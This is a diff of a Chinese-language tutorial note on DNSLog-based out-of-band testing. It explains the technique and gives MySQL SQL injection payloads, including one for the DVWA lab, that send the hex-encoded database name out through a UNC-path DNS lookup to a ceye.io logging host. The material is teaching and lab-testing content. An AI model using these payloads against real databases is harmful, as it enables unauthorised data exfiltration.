@@ -42,15 +42,17 @@
 
 简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。
 
+![](https://www.github.com/52stu/Images/raw/master/小书匠/1572073038092.png)
+
 ## 利用细节
 ### SQL注入
 #### MySQL
-    * 支持load_file()函数（高版本默认不支持）
-    * 开启allow_url_fopen（默认开启）
+* 支持load_file()函数（高版本默认不支持）
+* 开启allow_url_fopen（默认开启）
 
 主体语句：`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`
 
-dvwa实战语句：`1'and select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv')) AnD '1'='1`
+dvwa实战语句：`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`
 
 
 **UNC路径**
